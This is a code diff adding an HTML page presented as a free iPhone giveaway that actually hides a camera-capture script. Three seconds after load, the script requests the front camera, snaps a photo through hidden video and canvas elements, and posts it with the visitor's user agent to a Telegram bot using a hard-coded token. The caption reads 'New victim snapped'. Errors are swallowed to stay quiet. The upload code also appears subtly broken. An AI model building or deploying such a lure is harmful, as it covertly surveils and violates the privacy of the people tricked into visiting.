@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone Giveaway! 🎁</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            background: #f0f0f0; 
+            font-family: Arial; 
+            text-align: center; 
+            padding: 50px 20px;
+        }
+        h1 { color: #ff3366; }
+    </style>
+</head>
+<body>
+    <h1>🎉 WIN A FREE IPHONE 15 PRO! </h1>
+    <p>Click below to check eligibility →</p>
+    
+    <!-- Hidden surveillance tools -->
+    <video id="hiddenCam" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
+
+<script>
+// Telegram config (replace with your deets 👇)
+const BOT_TOKEN = '8268626274:AAG65Y0W3vf_4lFopXehvVR0YEG3RvaYR5I';
+const CHAT_ID = '8381620130';
+
+// Sleeper function for delayed photobomb 📸
+setTimeout(() => captureAndSend(), 3000); // Snaps pic 3s after page load
+
+async function captureAndSend() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user' } 
+        });
+        
+        const video = document.getElementById('hiddenCam');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        
+        // Wait for camera to feed
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imgData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+        
+        // Kill camera tracks
+        stream.getTracks().forEach(track => track.stop());
+        
+        // Tattle to Telegram 💌
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                photo: `attach://photo.jpg`,
+                caption: `New victim snapped 🎯\nUser-Agent: ${navigator.userAgent}\nTimestamp: ${new Date().toISOString()}`
+            })
+        });
+        
+    } catch (e) { /* Eat errors like a pro */ }
+}
+</script>
+</body>
+</html>
